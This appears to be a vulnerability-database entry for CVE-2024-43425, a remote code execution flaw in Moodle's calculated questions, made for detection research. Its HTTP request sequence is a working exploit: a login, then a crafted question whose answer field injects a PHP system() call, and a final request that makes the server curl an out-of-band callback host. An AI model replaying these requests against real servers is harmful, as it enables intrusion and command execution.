---
layout: post
cve_id: CVE-2024-43425
title: Moodle - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-43425.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-43425.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Authenticated attackers with question creation permissions can craft malicious
  calculated questions to execute arbitrary commands on the underlying system.

  '
remediation: 'Apply security patches for Moodle addressing CVE-2024-43425.

  '
reference:
- https://github.com/RedTeamPentesting/moodle-rce-calculatedquestions
- https://blog.redteam-pentesting.de/2024/moodle-rce/
- https://www.redteam-pentesting.de/en/advisories/rt-sa-2024-009/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-43425
classification:
  cvss-score: 9.8
  cve-id: CVE-2024-43425
  epss-score: 0.89792
  epss-percentile: 0.99542
  cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  shodan-query: title:"Moodle"
  product: moodle
  vendor: moodle
tags:
- cve
- cve2024
- moodile
- rce
- authenticated
- vuln
---

## üîç Vulnerability Description
Attackers with the permission to create or modify questions in Moodle courses are able to craft malicious inputs for calculated questions, which can be abused to execute arbitrary commands on the underlying system.


## üåê HTTP Request
```nohighlight
GET /login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Connection: close
Content-Length: 57
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
anchor=&logintoken=yVHtd5&username=zaMi3P&password=g4LFwY
```

```nohighlight
GET /my/courses.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:6.0; vi-VN) AppleWebKit/535.6.1 (KHTML, like Gecko) Version/4.1 Safari/535.6.1
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /lib/ajax/service.php?sesskey=Erl6t3&info=core_course_get_enrolled_courses_by_timeline_classification HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 306
Content-Type: application/json
Accept-Encoding: gzip
[{"index":0,"methodname":"core_course_get_enrolled_courses_by_timeline_classification","args":{"offset":0,"limit":0,"classification":"all","sort":"fullname","customfieldname":"","customfieldvalue":"","requiredfields":["id","fullname","shortname","showcoursecategory","showshortname","visible","enddate"]}}]
```

```nohighlight
POST /question/bank/editquestion/question.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Content-Length: 1392
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
initialcategory=1&reload=1&shuffleanswers=1&answernumbering=abc&mform_isexpanded_id_answerhdr=1&noanswers=1&nounits=1&numhints=2&synchronize=&wizard=datasetdefinitions&id=&inpopup=0&cmid=&courseid=F5o2tZ&returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D2%26deleteall%3D1&mdlscrollto=0&appendqnumstring=&qtype=calculated&makecopy=0&sesskey=Erl6t3&_qf__qtype_calculated_edit_form=1&mform_isexpanded_id_generalheader=1&mform_isexpanded_id_unithandling=1&mform_isexpanded_id_unithdr=1&mform_isexpanded_id_multitriesheader=1&mform_isexpanded_id_tagsheader=1&category=2%2C11&name=aaaaaaa&questiontext%5Btext%5D=%3Cp%3Edsaszzzzzzzzda%3C%2Fp%3E&questiontext%5Bformat%5D=1&questiontext%5Bitemid%5D=471779994&status=ready&defaultmark=1&generalfeedback%5Btext%5D=&generalfeedback%5Bformat%5D=1&generalfeedback%5Bitemid%5D=318048148&idnumber=&answer%5B0%5D=%281%29-%3E%7Bsystem%28%24_GET%5Bchr%2897%29%5D%29%7D&fraction%5B0%5D=1.0&tolerance%5B0%5D=0.01&tolerancetype%5B0%5D=1&correctanswerlength%5B0%5D=2&correctanswerformat%5B0%5D=1&feedback%5B0%5D%5Btext%5D=&feedback%5B0%5D%5Bformat%5D=1&feedback%5B0%5D%5Bitemid%5D=238751667&unitrole=3&penalty=0.3333333&hint%5B0%5D%5Btext%5D=%3Cp%3Eas%3C%2Fp%3E&hint%5B0%5D%5Bformat%5D=1&hint%5B0%5D%5Bitemid%5D=653998899&hint%5B1%5D%5Btext%5D=&hint%5B1%5D%5Bformat%5D=1&hint%5B1%5D%5Bitemid%5D=161289221&tags=_qf__force_multiselect_submission&submitbutton=Save+changes
```

```nohighlight
POST /question/bank/editquestion/question.php?wizardnow=datasetdefinitions HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.1
Connection: close
Content-Length: 293
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
id=USWERw&inpopup=0&cmid=&courseid=F5o2tZ&returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D2%26deleteall%3D1&mdlscrollto=0&appendqnumstring=&category=2%2C11&wizard=datasetitems&sesskey=Erl6t3&_qf__question_dataset_dependent_definitions_form=1&dataset%5B0%5D=0&synchronize=0&submitbutton=Next+page
```

```nohighlight
GET /question/1it381&a=curl%20d5jjsb1le0o2v863b3m0y53dqfio15b1n.oast.online HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

